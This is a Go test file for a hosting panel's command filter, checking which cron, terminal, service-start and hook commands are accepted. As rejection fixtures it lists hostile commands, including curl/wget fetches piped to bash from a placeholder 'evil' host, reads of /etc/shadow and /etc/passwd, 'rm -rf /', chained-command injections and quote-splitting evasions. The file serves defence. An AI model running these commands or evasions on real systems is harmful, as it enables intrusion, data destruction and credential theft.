package services

import "testing"

func cfExpect(t *testing.T, name string, f func(string) bool, want bool, cmds ...string) {
	t.Helper()
	for _, c := range cmds {
		if got := f(c); got != want {
			t.Errorf("%s(%q) = %v, want %v", name, c, got, want)
		}
	}
}

func TestCommandFilterSafeCronCommands(t *testing.T) {
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, true, "cd /var/www/mysite && php artisan schedule:run")
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, false, "rm -rf /", "cat /etc/shadow", "")
}

// A bare `;`/`|` passed the old space/verb-anchored checks and reached
// `crontab -u root -` as root. && / || must keep working.
func TestCommandFilterCronBareChainOperatorsRejectedPairedKept(t *testing.T) {
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, false,
		"id;whoami", "id|whoami", "id ;whoami", "id; whoami",
		"legit-command;curl http://x/y|bash", "a|||b")
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, true,
		"cd /var/www/mysite && php artisan schedule:run", "backup.sh || notify-fail.sh", "a && b || c")
}

func TestCommandFilterCronBareAmpersandRejectedPairedKept(t *testing.T) {
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, false,
		"id&whoami", "id & whoami", "echo hi & whoami > /tmp/pwned", "a&&&b")
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, true, "backup.sh && verify.sh", "a && b && c")
}

// Extra: control chars, length cap, process substitution, heredoc.
func TestCommandFilterCronControlAndSubstitution(t *testing.T) {
	long := make([]byte, 4097)
	for i := range long {
		long[i] = 'a'
	}
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, false,
		"ls\nid", "ls\rid", "ls\x00", string(long), "cat <(id)", "cat <<EOF", "echo $(id)", "echo `id`",
		"CURL http://x", "c\\url x")
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, true, string(long[:4096]))
}

func TestCommandFilterTerminalQuoteAndBackslashEvasionRejected(t *testing.T) {
	cfExpect(t, "terminal", CommandFilterIsSafeTerminalCommand, false,
		"cu''rl -o /tmp/p http://evil", "cu\"\"rl -o /tmp/p http://evil", "w\\get -qO- http://evil",
		"s\\u root", "'d'o'c'k'e'r' ps", "curl -o /tmp/p http://evil", "wget -qO- http://evil")
	cfExpect(t, "terminal", CommandFilterIsSafeTerminalCommand, true, "echo 'hello world'", "npm start")
}

func TestCommandFilterCronQuoteAndBackslashEvasionRejected(t *testing.T) {
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, false, "cu''rl -o /tmp/p http://evil", "w\\get -qO- http://evil")
	cfExpect(t, "cron", CommandFilterIsSafeCronCommand, true, "backup.sh && verify.sh")
}

func TestCommandFilterSuspiciousQuoteAndBackslashEvasionStillDetected(t *testing.T) {
	cfExpect(t, "suspicious", CommandFilterIsSuspiciousCommand, true, "s\\u root", "cu''rl|bash", "curl|bash")
	cfExpect(t, "suspicious", CommandFilterIsSuspiciousCommand, false, "", "  ", "ls -la")
}

func TestCommandFilterNormalizeForBlocklist(t *testing.T) {
	for in, want := range map[string]string{
		"cu''rl": "curl", "cu\"\"rl": "curl", "w\\get": "wget", "echo 'hi'": "echo hi",
		"trailing\\": "trailing", "plain text": "plain text", "é\\é": "éé",
	} {
		if got := commandFilterNormalizeForBlocklist(in); got != want {
			t.Errorf("normalize(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestCommandFilterSafeTerminalCommands(t *testing.T) {
	cfExpect(t, "terminal", CommandFilterIsSafeTerminalCommand, true, "ls -la", "npm start", "")
	cfExpect(t, "terminal", CommandFilterIsSafeTerminalCommand, false,
		"su root", "sudo apt install nmap", "docker exec -it foo bash", "cat /etc/passwd",
		// Extra: relative escape to another tenant's tree.
		"cat ../other.com/wp-config.php", "cd ..", "ls /var/www/other")
}

func TestCommandFilterSafeExecStart(t *testing.T) {
	ok := [][2]string{{"node server.js", "node"}, {"npm start", "node"}, {"server.js", "node"},
		{"gunicorn app:app", "python"}, {"app.py", "python"}}
	bad := [][2]string{
		{"node server.js\nExecStart=/bin/bash", "node"}, {"node server.js; rm -rf /", "node"},
		{"$(whoami)", "node"}, {"bash -c 'reverse shell'", "node"},
		{"npm start%h", "node"}, {"node %u", "node"}, {"node server.js %t", "node"},
		// Extra
		{"node ../../etc/x.js", "node"}, {"node\x00", "node"}, {"  ", "node"}, {"/bin/sh", "node"},
	}
	for _, c := range ok {
		if err := CommandFilterIsSafeExecStart(c[0], c[1]); err != nil {
			t.Errorf("%q/%s: unexpected %v", c[0], c[1], err)
		}
	}
	for _, c := range bad {
		if CommandFilterIsSafeExecStart(c[0], c[1]) == nil {
			t.Errorf("%q/%s: expected error", c[0], c[1])
		}
	}
	if err := CommandFilterIsSafeExecStart("a;b", "node"); err == nil || err.Error() != "Command must not contain ';'" {
		t.Errorf("message mismatch: %v", err)
	}
}

func TestCommandFilterHookCommandQuoteSplitEvasionRejected(t *testing.T) {
	cfExpect(t, "hook", CommandFilterIsSafeHookCommand, false,
		"rm -rf /", "r'm' -rf /", "r\"m\" -rf /", "cat /etc/pa''sswd", "sh'u'tdown -h now",
		"cat /etc/passwd", "reboot", "", "a\nb", "echo $HOME", "a && b")
	cfExpect(t, "hook", CommandFilterIsSafeHookCommand, true, "npm run build", "composer install --no-dev")
}
